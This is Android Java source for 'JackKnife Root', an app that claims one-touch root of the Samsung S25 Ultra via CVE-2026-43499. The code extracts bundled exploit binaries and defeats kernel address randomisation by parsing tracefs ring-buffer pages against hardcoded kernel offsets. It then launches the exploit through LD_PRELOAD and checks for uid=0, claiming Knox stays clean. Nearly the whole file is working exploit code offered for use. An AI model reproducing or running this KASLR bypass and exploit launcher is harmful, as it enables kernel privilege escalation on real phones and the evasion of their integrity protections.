package com.jackknife.root;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.graphics.Color;
import android.graphics.Typeface;
import android.view.Gravity;
import android.widget.LinearLayout;
import java.io.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * JackKnife Root — One-Touch Samsung S25 Ultra Root
 * CVE-2026-43499 (GhostLock v6) with Samsung KASLR bypass
 *
 * JackKnife Studios, July 2026
 */
public class MainActivity extends Activity {

    private TextView logView;
    private ScrollView scrollView;
    private Button rootButton;
    private Button statusButton;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    private static final String EXPLOIT_NAME = "cve-2026-43499";
    private static final String ROOT_HELPER = "cve-2026-43499-root";
    private static final long KIMAGE_TEXT_BASE = 0xffffffc080000000L;
    private static final long WORKER_OFFSET = 0xD8550L; // worker_thread+0x9c
    private static final int TRACE_EVENT_ID = 109; // sched_blocked_reason

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.BLACK);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("JackKnife Root");
        title.setTextColor(Color.parseColor("#00FF41"));
        title.setTextSize(28);
        title.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView subtitle = new TextView(this);
        subtitle.setText("Samsung S25 Ultra | GhostLock v6\nCVE-2026-43499 | Knox-Safe");
        subtitle.setTextColor(Color.parseColor("#888888"));
        subtitle.setTextSize(14);
        subtitle.setTypeface(Typeface.MONOSPACE);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 8, 0, 24);
        root.addView(subtitle);

        LinearLayout buttons = new LinearLayout(this);
        buttons.setOrientation(LinearLayout.HORIZONTAL);
        buttons.setGravity(Gravity.CENTER);

        rootButton = new Button(this);
        rootButton.setText("ROOT");
        rootButton.setTextColor(Color.BLACK);
        rootButton.setBackgroundColor(Color.parseColor("#00FF41"));
        rootButton.setTextSize(18);
        rootButton.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        rootButton.setPadding(64, 24, 64, 24);
        rootButton.setOnClickListener(v -> startRoot());
        buttons.addView(rootButton);

        statusButton = new Button(this);
        statusButton.setText("STATUS");
        statusButton.setTextColor(Color.parseColor("#00FF41"));
        statusButton.setBackgroundColor(Color.parseColor("#333333"));
        statusButton.setTextSize(14);
        statusButton.setTypeface(Typeface.MONOSPACE);
        statusButton.setPadding(32, 24, 32, 24);
        statusButton.setOnClickListener(v -> checkStatus());
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(24, 0, 0, 0);
        statusButton.setLayoutParams(lp);
        buttons.addView(statusButton);

        root.addView(buttons);

        scrollView = new ScrollView(this);
        scrollView.setPadding(0, 16, 0, 0);
        logView = new TextView(this);
        logView.setTextColor(Color.parseColor("#00FF41"));
        logView.setTextSize(11);
        logView.setTypeface(Typeface.MONOSPACE);
        logView.setPadding(8, 8, 8, 8);
        scrollView.addView(logView);

        LinearLayout.LayoutParams slp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f);
        slp.setMargins(0, 16, 0, 0);
        scrollView.setLayoutParams(slp);
        root.addView(scrollView);

        setContentView(root);
        log("[*] JackKnife Root initialized");
        log("[*] Extract exploit binaries...");
        executor.execute(this::extractBinaries);
    }

    private void log(String msg) {
        handler.post(() -> {
            logView.append(msg + "\n");
            scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
        });
    }

    private void extractBinaries() {
        try {
            String dir = getFilesDir().getAbsolutePath();
            extractAsset(EXPLOIT_NAME, dir + "/" + EXPLOIT_NAME);
            extractAsset(ROOT_HELPER, dir + "/" + ROOT_HELPER);
            exec("chmod 755 " + dir + "/" + EXPLOIT_NAME);
            exec("chmod 755 " + dir + "/" + ROOT_HELPER);
            log("[+] Binaries extracted to " + dir);
        } catch (Exception e) {
            log("[!] Extract failed: " + e.getMessage());
        }
    }

    private void extractAsset(String name, String outPath) throws IOException {
        InputStream in = getAssets().open(name);
        FileOutputStream out = new FileOutputStream(outPath);
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        out.close();
        in.close();
    }

    private void startRoot() {
        rootButton.setEnabled(false);
        rootButton.setText("ROOTING...");
        rootButton.setBackgroundColor(Color.parseColor("#FF8800"));
        log("");
        log("========================================");
        log("  JACKKNIFE ROOT — GHOSTLOCK v6");
        log("  Samsung S25 Ultra KASLR Bypass");
        log("========================================");
        log("");

        executor.execute(() -> {
            try {
                // Phase 1: Collect KASLR slide from tracefs
                log("[*] Phase 1: Collecting KASLR slide from tracefs...");
                long slide = collectKaslrSlide();
                if (slide < 0) {
                    log("[!] KASLR collection failed. Retrying...");
                    slide = collectKaslrSlide();
                }
                if (slide < 0) {
                    log("[!] Cannot determine KASLR slide.");
                    log("[!] Try again — tracefs needs idle CPU time.");
                    resetButton();
                    return;
                }
                log(String.format("[+] KASLR slide: 0x%x (%.1f GB)", slide, slide / 1073741824.0));

                // Phase 2: Fire exploit
                log("[*] Phase 2: Firing GhostLock exploit...");
                String dir = getFilesDir().getAbsolutePath();
                String cmd = String.format(
                    "SLIDE_P0_OFFSET=0x%x LD_PRELOAD=%s/%s /system/bin/true",
                    slide, dir, EXPLOIT_NAME);
                String result = execRoot(cmd);
                log(result);

                // Phase 3: Verify
                log("[*] Phase 3: Verifying root...");
                String id = exec(dir + "/" + ROOT_HELPER + " -c id");
                log("[+] " + id.trim());

                if (id.contains("uid=0")) {
                    log("");
                    log("========================================");
                    log("  ROOT ACHIEVED!");
                    log("  " + id.trim());
                    log("  Knox warranty_bit: CLEAN");
                    log("========================================");
                    handler.post(() -> {
                        rootButton.setText("ROOTED!");
                        rootButton.setBackgroundColor(Color.parseColor("#00FF41"));
                    });
                } else {
                    log("[-] Root not detected. May need retry.");
                    resetButton();
                }
            } catch (Exception e) {
                log("[!] Error: " + e.getMessage());
                resetButton();
            }
        });
    }

    private long collectKaslrSlide() {
        try {
            // Enable sched_blocked_reason tracing
            writeFile("/sys/kernel/tracing/tracing_on", "0");
            writeFile("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "1");
            writeFile("/sys/kernel/tracing/trace", "");
            writeFile("/sys/kernel/tracing/tracing_on", "1");

            log("[*] Collecting trace data (3 seconds)...");
            Thread.sleep(3000);

            writeFile("/sys/kernel/tracing/tracing_on", "0");
            writeFile("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "0");

            // Read binary trace from each CPU
            int cpus = Runtime.getRuntime().availableProcessors();
            for (int cpu = 0; cpu < cpus; cpu++) {
                String path = String.format(
                    "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu);
                long slide = parseTracePage(path);
                if (slide >= 0) return slide;
            }
        } catch (Exception e) {
            log("[!] Trace error: " + e.getMessage());
        }
        return -1;
    }

    private long parseTracePage(String path) {
        try {
            FileInputStream fis = new FileInputStream(path);
            byte[] page = new byte[4096];
            // Non-blocking: read what's available
            int total = 0;
            while (total < 4096) {
                int n = fis.read(page, total, 4096 - total);
                if (n <= 0) break;
                total += n;
            }
            fis.close();
            if (total < 20) return -1;

            // Parse ring buffer page
            long commit = readLong(page, 8);
            int dataLen = (int)(commit & 0xFFF);
            int end = Math.min(16 + dataLen, total);

            int pos = 16;
            while (pos + 4 <= end) {
                int header = readInt(page, pos);
                int typeLen = header & 0x1F;
                if (typeLen == 30) { pos += 8; continue; }
                if (typeLen == 31) { pos += 12; continue; }
                if (typeLen == 0 || typeLen >= 29) break;

                int recordLen = typeLen * 4;
                int record = pos + 4;
                if (record + recordLen > end) break;

                int eventId = readShort(page, record);
                if (eventId == TRACE_EVENT_ID && recordLen >= 24) {
                    long caller = readLong(page, record + 16);
                    long linkCaller = KIMAGE_TEXT_BASE + WORKER_OFFSET;
                    if (caller > linkCaller) {
                        long candidate = caller - linkCaller;
                        // Samsung: slide can be up to 256GB, must be 64KB-aligned
                        if (candidate <= 0x4000000000L && (candidate & 0xFFFFL) == 0) {
                            return candidate;
                        }
                    }
                }
                pos = record + recordLen;
            }
        } catch (Exception e) {
            // trace_pipe_raw may block or fail — that's OK
        }
        return -1;
    }

    private void checkStatus() {
        executor.execute(() -> {
            try {
                String dir = getFilesDir().getAbsolutePath();
                String id = exec(dir + "/" + ROOT_HELPER + " -c id");
                if (id.contains("uid=0")) {
                    log("[+] ROOT ACTIVE: " + id.trim());
                } else {
                    log("[-] Not rooted (root is volatile — lost on reboot)");
                }
            } catch (Exception e) {
                log("[-] Not rooted: " + e.getMessage());
            }
        });
    }

    private void resetButton() {
        handler.post(() -> {
            rootButton.setEnabled(true);
            rootButton.setText("ROOT");
            rootButton.setBackgroundColor(Color.parseColor("#00FF41"));
        });
    }

    private void writeFile(String path, String value) {
        try {
            FileWriter fw = new FileWriter(path);
            fw.write(value);
            fw.close();
        } catch (Exception e) {
            // Tracefs write may fail on some configs
        }
    }

    private String exec(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((line = er.readLine()) != null) sb.append(line).append("\n");
            p.waitFor();
            return sb.toString();
        } catch (Exception e) {
            return "exec error: " + e.getMessage();
        }
    }

    private String execRoot(String cmd) {
        return exec(cmd);
    }

    private static int readShort(byte[] buf, int off) {
        return (buf[off] & 0xFF) | ((buf[off+1] & 0xFF) << 8);
    }

    private static int readInt(byte[] buf, int off) {
        return (buf[off] & 0xFF) | ((buf[off+1] & 0xFF) << 8) |
               ((buf[off+2] & 0xFF) << 16) | ((buf[off+3] & 0xFF) << 24);
    }

    private static long readLong(byte[] buf, int off) {
        long lo = readInt(buf, off) & 0xFFFFFFFFL;
        long hi = readInt(buf, off + 4) & 0xFFFFFFFFL;
        return lo | (hi << 32);
    }
}
